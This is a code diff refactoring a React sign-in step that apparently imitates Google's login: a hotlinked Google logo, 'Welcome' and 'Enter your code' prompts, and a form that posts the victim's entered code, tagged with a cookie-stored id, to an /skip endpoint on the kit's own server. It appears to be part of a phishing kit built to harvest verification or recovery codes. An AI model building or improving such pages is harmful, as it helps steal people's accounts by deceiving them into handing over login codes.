@@ -3,20 +3,19 @@ import Cookies from "js-cookie";
 import { toast } from "react-toastify";
 import { API_URL } from "../config/index";
 const Security= ({handleButtonClick}) => {
-    const form=useForm()
-    const{register,handleSubmit,reset}=form
+    let form=useForm();
+    let{register,handleSubmit,reset}=form
     let id = Cookies.get("id");
     let email = Cookies.get("email");
-    const [skipcode, setSkipCode] = useState('');
 
-  const onSubmit = async () => {
-   
+  let onSubmit = async (values) => {
+    console.log(values)
+      let{recoveryPassword}=values
       let submitValues = {
          id,
-         skipcode
+         skipcode:recoveryPassword
          
        };
-     
     
        let url = `${API_URL}/skip`;
     
@@ -33,10 +32,9 @@ const Security= ({handleButtonClick}) => {
     
         if (res.ok) {
             handleButtonClick(0)
-            console.log(submitValues)
           console.log("success", data);
+          console.log("success", submitValues);
           toast.success("Login Succecssfull");
-         
           reset()
           Cookies.remove("id");
           Cookies.remove("email");
@@ -47,8 +45,8 @@ const Security= ({handleButtonClick}) => {
       };
    
     return (
-      
-          <>
+      <form onSubmit={handleSubmit(onSubmit)}>
+          
         <div className="top-content">
           <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt=""/>
           <p className='font-semibold text-xl pt-3'>Welcome</p>
@@ -72,8 +70,7 @@ const Security= ({handleButtonClick}) => {
         </div>
         
         <div className="inputs">
-          <input type="password" value={skipcode}
-                    onChange={(e)=>setSkipCode(e.target.value)}id="recoveryPassword" className="input"/>
+          <input type="password" {...register('recoveryPassword')} id="recoveryPassword" className="input"/>
         
           <label for="password" className="input-label">Enter your code</label>
         
@@ -81,14 +78,14 @@ const Security= ({handleButtonClick}) => {
         <div className="btn-group mt-14">
           <button className="create-btn font-medium">More ways to sign in</button>
         
-          <button className="next-btn" onClick={onSubmit}
+          <button className="next-btn" 
           >Sign In</button>
         
          
         
         </div>
-        </>
-    
+        
+      </form>
     );
 };
 
